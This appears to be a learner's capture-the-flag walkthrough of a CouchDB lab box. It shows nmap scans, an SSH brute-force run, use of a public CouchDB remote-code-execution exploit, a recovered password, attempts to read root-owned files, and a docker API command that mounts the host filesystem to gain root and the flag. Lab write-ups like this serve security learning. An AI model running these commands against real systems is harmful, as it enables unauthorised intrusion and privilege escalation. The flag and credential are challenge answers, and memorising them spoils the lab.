```bash
┌──(kali㉿kali)-[~]
└─$ nmap 10.10.171.240           
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-01 10:25 EDT
Nmap scan report for 10.10.171.240
Host is up (0.10s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 10.90 seconds
```                                                                                                                
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sCV -p- -Pn --open --min-rate 5000 -T5 -vv 10.10.171.240
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-01 10:26 EDT
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:26
Completed NSE at 10:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:26
Completed NSE at 10:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:26
Completed NSE at 10:26, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:26
Completed Parallel DNS resolution of 1 host. at 10:26, 0.03s elapsed
Initiating Connect Scan at 10:26
Scanning 10.10.171.240 [65535 ports]
Discovered open port 22/tcp on 10.10.171.240
Completed Connect Scan at 10:27, 38.24s elapsed (65535 total ports)
Initiating Service scan at 10:27
Scanning 1 service on 10.10.171.240
Completed Service scan at 10:27, 0.24s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.171.240.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:27
Completed NSE at 10:27, 3.12s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:27
Completed NSE at 10:27, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:27
Completed NSE at 10:27, 0.00s elapsed
Nmap scan report for 10.10.171.240
Host is up, received user-set (0.25s latency).
Scanned at 2021-07-01 10:26:36 EDT for 43s
Not shown: 65043 filtered ports, 491 closed ports
Reason: 65043 no-responses and 491 conn-refused
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMXnGZUnLWqLZb8VQiVH0z85lV+G4KY5l5kKf1fS7YgSnfZ+k3CRjAZPuGceg5RQEUbOMCm+0u4SDyIEbwwAXGv0ORK4/VEIyJlZmtlqeyASwR8ML4yjdGqinqOUZ3jN/ZIg4veJ02nr86GZP+Nto0TZt7beaIxykMEZHTdo0CctdKLIet7PpvwG4F5Tn9MBoys9pUjfpcnwbf91Tv6i56Gipo07jKgb5vP8Nl1TXPjWB93WNW2vWEQ1J4tiyZlBeLOaNaEbxvNQFnKxjVYiiLCbcofwSdrwZ7/+sIy5BdiNW+k81rBN3OqaQNZ8urFaiXXf/ukRr/hhjY5a6m0MHn
|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNTR07g3p8MfnQVnv8uqj8GGDH6VoSRzwRFflMbEf3WspsYyVipg6vtNQMaq5uNGUXF8ubpsnHeJA+T3RilTLXc=
|   256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKLUyz2Tpwc5qPuFxV+HnGBeqLC6NWrmpmGmE0hk7Hlj
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:27
Completed NSE at 10:27, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:27
Completed NSE at 10:27, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:27
Completed NSE at 10:27, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.08 seconds





┌──(kali㉿kali)-[~]
└─$ smbclient -L \\\\10.10.171.240    
do_connect: Connection to 10.10.171.240 failed (Error NT_STATUS_CONNECTION_REFUSED)
                                                                                   
┌──(kali㉿kali)-[~]
└─$ smbclient -L \\10.10.171.240                                               1 ⨯
do_connect: Connection to 10.10.171.240 failed (Error NT_STATUS_CONNECTION_REFUSED)
 
 
 
┌──(kali㉿kali)-[~]
└─$ nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst \
      --script-args ssh-brute.timeout=4s 10.10.171.240
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-01 10:37 EDT
N
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 929 guesses in 601 seconds, average tps: 2.0

Nmap done: 1 IP address (1 host up) scanned in 605.24 seconds
  
  
```
ohhhhhhh f***
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sCV -p- -Pn -T5 -v 10.10.171.240 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-01 10:48 EDT
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:48
Completed NSE at 10:48, 0.00s elapsed
Initiating NSE at 10:48
Completed NSE at 10:48, 0.00s elapsed
Initiating NSE at 10:48
Completed NSE at 10:48, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:48
Completed Parallel DNS resolution of 1 host. at 10:48, 0.02s elapsed
Initiating Connect Scan at 10:48
Scanning 10.10.171.240 [65535 ports]
Discovered open port 22/tcp on 10.10.171.240
Warning: 10.10.171.240 giving up on port because retransmission cap hit (2).
Connect Scan Timing: About 7.14% done; ETC: 10:55 (0:06:43 remaining)
Connect Scan Timing: About 15.12% done; ETC: 10:56 (0:07:07 remaining)
Connect Scan Timing: About 22.50% done; ETC: 10:56 (0:06:05 remaining)
Connect Scan Timing: About 30.23% done; ETC: 10:55 (0:05:14 remaining)
Connect Scan Timing: About 37.90% done; ETC: 10:55 (0:04:32 remaining)
Connect Scan Timing: About 45.17% done; ETC: 10:55 (0:03:58 remaining)
Connect Scan Timing: About 53.17% done; ETC: 10:55 (0:03:19 remaining)
Connect Scan Timing: About 63.99% done; ETC: 10:55 (0:02:24 remaining)
Discovered open port 5984/tcp on 10.10.171.240
Connect Scan Timing: About 74.54% done; ETC: 10:54 (0:01:38 remaining)
Connect Scan Timing: About 84.77% done; ETC: 10:54 (0:00:57 remaining)
Completed Connect Scan at 10:54, 367.43s elapsed (65535 total ports)
Initiating Service scan at 10:54
Scanning 2 services on 10.10.171.240
Completed Service scan at 10:54, 11.35s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.171.240.
Initiating NSE at 10:54
Completed NSE at 10:54, 3.28s elapsed
Initiating NSE at 10:54
Completed NSE at 10:54, 0.44s elapsed
Initiating NSE at 10:54
Completed NSE at 10:54, 0.01s elapsed
Nmap scan report for 10.10.171.240
Host is up (0.10s latency).
Not shown: 64975 closed ports, 558 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
|_  256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
|_http-favicon: Unknown favicon MD5: 2AB2AAE806E8393B70970B2EAACE82E0
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 10:54
Completed NSE at 10:54, 0.00s elapsed
Initiating NSE at 10:54
Completed NSE at 10:54, 0.00s elapsed
Initiating NSE at 10:54
Completed NSE at 10:54, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 387.47 seconds
  
  
  
{"couchdb":"Welcome","uuid":"ef680bb740692240059420b2c17db8f3","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}
```


https://www.exploit-db.com/exploits/44913

couchdb.py

```bash
┌──(kali㉿kali)-[/hackme/scripts]
└─$ python couchdb.py --priv -c "id" http://10.10.171.240:5984                                                                         1 ⨯
[*] Detected CouchDB Version 1.6.1
[+] User guest with password guest successfully created.
[+] Created payload at: http://10.10.171.240:5984/_config/query_servers/cmd

                                                  
    
┌──(kali㉿kali)-[/hackme/scripts]
└─$ python couchdb.py --priv -c "ef680bb740692240059420b2c17db8f3" http://10.10.171.240:5984                                                                         1 ⨯
[*] Detected CouchDB Version 1.6.1
[+] User guest with password guest successfully created.
[+] Created payload at: http://10.10.171.240:5984/_config/query_servers/cmd
```



that didn't really work, probably did , but not getting along, 


https://docs.couchdb.org/en/1.6.1/intro/tour.html



all databases
["_replicator","_users","couch","god","secret","test_suite_db","test_suite_db2"]

nosql    js for loop becomes query ???


_util   directory ,,, very GUI



atena:t4qfzcc4qN##



LFILE=file_to_read
./ssh-keyscan -f $LFILE

LFILE=/root/root.txt
./usr/lib/openssh/ssh-keysign -f $LFILE

didn't work, trying to see if i could modify a bit ,,, 


from history

```bash
sudo -s
cd /etc/apt/
rm sources.
rm sources.list
wget https://gist.githubusercontent.com/rohitrawat/60a04e6ebe4a9ec1203eac3a11d4afc1/raw/fcdfde2ab57e455ba9b37077abf85a81c504a4a9/sources.list
apt-get update
apt-get dist-upgrade 
sudo apt-get install software-properties-common
sudo add-apt-repository ppa:couchdb/stable
sudo apt-get update
sudo apt-get install couchdb
sudo chown -R couchdb:couchdb /usr/bin/couchdb /etc/couchdb /usr/share/couchdb
sudo chmod -R 0770 /usr/bin/couchdb /etc/couchdb /usr/share/couchdb
sudo systemctl restart couchdb
curl localhost:5984
apt install curl
curl localhost:5984
nano /etc/couchdb/local.ini
$ sudo systemctl restart couchdb
sudo systemctl restart couchdb
sudo firewall-cmd --zone=public --add-port=5984/tcp --permanent
sudo apt-get install build-essential curl nodejs
gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3
curl -sSL https://get.rvm.io | bash -s stable --ruby
curl -sSL https://rvm.io/mpapis.asc | sudo gpg --import -
curl -sSL https://rvm.io/pkuczynski.asc | sudo gpg --import -
gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3
curl -sSL https://get.rvm.io | bash -s stable --ruby
source /usr/local/rvm/scripts/rvm
rvm list known
rvm install 2.2



gem
gem unistall rails
rvm
ls
netstat -antl
apt-get remove rails
rails
rails -v
ls
netstat -antl
sudo apt-get install docker
sudo service docker status
sudo reboot
ps aux
ip addr
ls
cd /root
ls
cd flag/
ls
cd ..
rm -r flag/
apt-get remove redis
nano root.txt
exit
sudo deluser USERNAME sudo
sudo deluser atena sudo
exit
sudo -s
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine     
```

**look dummy**
uname -a




just run the docker command from history file,,,,,   wow, ,, , , , , , 

```bash
atena@ubuntu:~$ docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
/ # cat /root/root.txt
cat: can't open '/root/root.txt': No such file or directory
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/ # cd /root
~ # ls
~ # ls
~ # cd ..
/ # pwd
/
/ # ls
bin    dev    etc    home   lib    media  mnt    opt    proc   root   run    sbin   srv    sys    tmp    usr    var
/ # cd mnt
/mnt # ls
bin             etc             initrd.img.old  lost+found      opt             run             sys             var
boot            home            lib             media           proc            sbin            tmp             vmlinuz
dev             initrd.img      lib64           mnt             root            srv             usr             vmlinuz.old
/mnt # cd home
/mnt/home # ls
atena
/mnt/home # cd ..
/mnt # cd root
/mnt/root # ls
root.txt
/mnt/root # cat root.txt
THM{RCE_us1ng_Docker_API}
```

























    